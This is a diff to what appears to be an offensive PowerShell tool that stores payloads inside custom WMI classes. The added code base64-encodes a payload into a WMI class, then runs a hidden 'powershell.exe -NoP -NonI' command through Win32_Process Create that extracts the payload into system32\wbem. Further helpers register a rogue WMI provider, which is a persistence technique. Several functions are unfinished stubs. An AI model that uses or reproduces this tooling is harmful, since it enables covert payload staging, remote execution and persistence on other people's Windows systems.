@@ -1,14 +1,18 @@
 ################################################################################
 # Let's get the file over there
 ################################################################################
-Function Get-WMILength {
+Function Invoke-WMIUpload {
 <#
 	.SYNOPSIS
-	Tests the max length of a string that can be inserted into the WMI Class
-	.PARAMETER ClassName
-	Name of Class to Test Against
+	
+	.PARAMETER Target
+    
+    .PARAMETER Payload
+
+    .PARAMETER ClassName
+	
 	.EXAMPLE
-	$length = Get-WMILength -Verbose -ClassName WMIFS
+	
 #>
 
     [CmdletBinding()]
@@ -21,20 +25,239 @@ Function Get-WMILength {
             [string]$ClassName = "WMIFS"
     )
     Begin {
-
     } Process {
         New-WMIClass -ClassName WMIFS -Verbose -Target $Target
-
         $EncodedText = ConvertTo-Base64 -FileName $Payload -Verbose
-        Invoke-InsertFile -EncodedText $EncodedText -FileName $Payload -ClassName $ClassName -StrLen 8000 -Verbose
-
-        $File = Invoke-RetrieveFile -FileName "cmd.exe" -ClassName WMIFS -Verbose
-        ConvertFrom-Base64 -EncodedText $File -FileName 'C:\calc.exe' -Verbose
-
-        Remove-WmiObject WMIFS
+        Invoke-InsertFile -EncodedText $EncodedText -FileName $Payload -ClassName $ClassName -StrLen 8000 -Verbose        
     } End { 
-    
     }
+}
+
+################################################################################
+# Extract file remotely
+################################################################################
+Function Invoke-WMIRemoteExtract {
+<#
+	.SYNOPSIS
+	
+	.PARAMETER Target
+    
+    .PARAMETER Payload
+
+    .PARAMETER ClassName
+
+    .PARAMETER Destination
+	
+	.EXAMPLE
+#>
+
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$true, HelpMessage="System to run against.")].
+            [string]$Target = ".",
+        [Parameter(Mandatory=$true, HelpMessage="Name of payload to extract.")]
+            [string]$Payload,
+        [Parameter(Mandatory=$true, HelpMessage="Class where payload is stored.")]
+            [string]$ClassName = "WMIFS",
+        [Parameter(Mandatory=$true, HelpMessage="Location on remote file system to place extracted file.")]
+            [string]$Destination = "$env:windir\system32\wbem\"
+    )
+    Begin {
+        $InvokeRetrieveFile = (Get-Command Invoke-RetrieveFile).Definition
+        $ConvertFromBase64 = (Get-Command ConvertFrom-Base64).Definition
+        $Command1 = "`$File = Invoke-RetrieveFile -FileName $Payload -ClassName $ClassName -Verbose"
+        $Command2 = "ConvertFrom-Base64 -EncodedText `$File -FileName $Destination\$Payload -Verbose"
+        $RemoteCommand = "powershell.exe -NoP -NonI -Command '$InvokeRetrieveFile; $ConvertFromBase64; $Command1; $Command2;'"
+    } Process {
+        Invoke-WmiMethod -Namespace "root\cimv2" -Class Win32_Process -Name Create -ArgumentList $RemoteCommand
+    } End { 
+    }
+}
+
+################################################################################
+# Register WMI Provider Method
+################################################################################
+Function Install-WMIProviderMethod {
+<#
+	.SYNOPSIS
+	
+	.PARAMETER Target
+    
+    .PARAMETER Payload
+
+    .PARAMETER ClassName
+	
+	.EXAMPLE
+#>
+
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
+            [string]$Target = ".",
+        [Parameter(Mandatory=$true, HelpMessage="Name of payload to extract.")]
+            [string]$Payload,
+        [Parameter(Mandatory=$true, HelpMessage="Class where payload is stored.")]
+            [string]$ClassName = "WMIFS"
+    )
+    Begin {
+        
+    } Process {
+        
+    } End { 
+    }
+}
+
+################################################################################
+# Extract file remotely
+################################################################################
+Function Install-WMIProvider {
+<#
+	.SYNOPSIS
+	
+	.PARAMETER Target
+    
+    .PARAMETER Payload
+
+    .PARAMETER ClassName
+
+    .PARAMETER Destination
+	
+	.EXAMPLE
+#>
+
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
+            [string]$Target = ".",
+        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
+            [string]$Payload,
+        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
+            [string]$ClassName = "WMIFS",
+        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
+            [string]$Destination = "$env:windir\system32\wbem\"
+    )
+    Begin {
+        
+    } Process {
+        
+    } End { 
+    }
+}
+
+################################################################################
+################################################################################
+Function local:Add-Method {
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$True, HelpMessage="Parameter to add property to.")] 
+            [Object][ref]$Parameters,
+        [Parameter(Mandatory=$True, HelpMessage="Property to add.")] 
+            [Object]$Property,
+        [Parameter(Mandatory=$True, HelpMessage=".")]
+            [ValidateSet("In", "Out")] 
+            [String]$Direction,
+        [Parameter(Mandatory=$True, HelpMessage=".")] 
+            [Int]$Index,
+        [Parameter(Mandatory=$True, HelpMessage=".")] 
+            [Object]$MappingStrings
+    )
+    $Parameters.Properties.Add($Property, [System.Management.CimType]::String, $false)
+    $Parameters.Properties[$Property].Qualifiers.Add($Direction, $false)
+    $Parameters.Properties[$Property].Qualifiers.Add("ID", $Index, $false, $true, $false, $false)
+    $Parameters.Properties[$Property].Qualifiers.Add("MappingStrings", [String[]]$MappingStrings)
+}
+
+################################################################################
+################################################################################
+Function local:Add-Property {
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$True, HelpMessage="Parameter to add property to.")] 
+            [Object][ref]$Parameters,
+        [Parameter(Mandatory=$True, HelpMessage="Property to add.")] 
+            [Object]$Property,
+        [Parameter(Mandatory=$True, HelpMessage=".")]
+            [ValidateSet("In", "Out")] 
+            [String]$Direction,
+        [Parameter(Mandatory=$True, HelpMessage=".")] 
+            [Int]$Index,
+        [Parameter(Mandatory=$True, HelpMessage=".")] 
+            [Object]$MappingStrings
+    )
+    $Parameters.Properties.Add($Property, [System.Management.CimType]::String, $false)
+    $Parameters.Properties[$Property].Qualifiers.Add($Direction, $false)
+    $Parameters.Properties[$Property].Qualifiers.Add("ID", $Index, $false, $true, $false, $false)
+    $Parameters.Properties[$Property].Qualifiers.Add("MappingStrings", [String[]]$MappingStrings)
+}
+
+################################################################################
+################################################################################
+Function local:New-Parameters {
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$True, HelpMessage=".")]
+            [ValidateSet("In", "Out")] 
+            [String]$Direction
+    )
+    $__PARAMETERS = New-Object System.Management.ManagementClass("ROOT", "__PARAMETERS", $null)
+    $InParameters = $__PARAMETERS.Clone()
+    $InParameters.Qualifiers.Add($Direction, $false)
+}
+
+################################################################################
+################################################################################
+Function local:Get-ManagementBaseObject {
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$True, HelpMessage=".")] 
+            [Object]$Class
+    )
+    $TempPtr = [System.IntPtr]$Class
+    $DotNetPath = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
+    $SystemManagement = [System.Reflection.Assembly]::LoadFile($DotNetPath+"System.Management.dll")
+
+    $IWbemClassObjectFreeThreaded = $SystemManagement.GetType(‘System.Management.IWbemClassObjectFreeThreaded’)
+    $IWbemClassObjectFreeThreaded_ctor = $IWbemClassObjectFreeThreaded.GetConstructors()[0]
+    $IWbemClassObjectFreeThreadedInstance = $IWbemClassObjectFreeThreaded_ctor.Invoke($TempPtr)
+
+    $ManagementBaseObject = $SystemManagement.GetType(‘System.Management.ManagementBaseObject’)
+    $ManagementBaseObject_ctor = $ManagementBaseObject.GetConstructors([Reflection.BindingFlags] "NonPublic, Instance")[1]
+    $ManagementBaseObjectInstance = $ManagementBaseObject_ctor.Invoke($IWbemClassObjectFreeThreadedInstance)
+
+    Return $ManagementBaseObjectInstance
+}
+
+################################################################################
+################################################################################
+Function local:Invoke-ProviderSetup {
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$True, HelpMessage=".")] 
+            [Object]$Class
+    )
+
+    $Guid = New-Object System.Guid
+
+    $__Win32Provider = Set-WmiInstance -Class __Win32Provider -Arguments @{
+        Name = $Provider;
+        ClsId = "{$Guid}";
+        ImpersonationLevel = 1;
+        PerUserInitialization = "FALSE";
+        HostingModel = "NetworkServiceHost";
+    };
+
+    $__InstanceProviderRegistration = Set-WmiInstance -Class __InstanceProviderRegistration -Arguments @{
+        Provider = $__Win32Provider;
+        SupportsGet = "TRUE";
+        SupportsPut = "TRUE";
+        SupportsDelete = "TRUE";
+        SupportsEnumeration = "TRUE";
+        QuerySupportLevels = [String[]]@("WQL:UnarySelect");
+    };
+
+    $__InstanceProviderRegistration = Set-WmiInstance -Class __MethodProviderRegistration -Arguments @{
+        Provider = $__Win32Provider;
+    };
 }
 
 ################################################################################
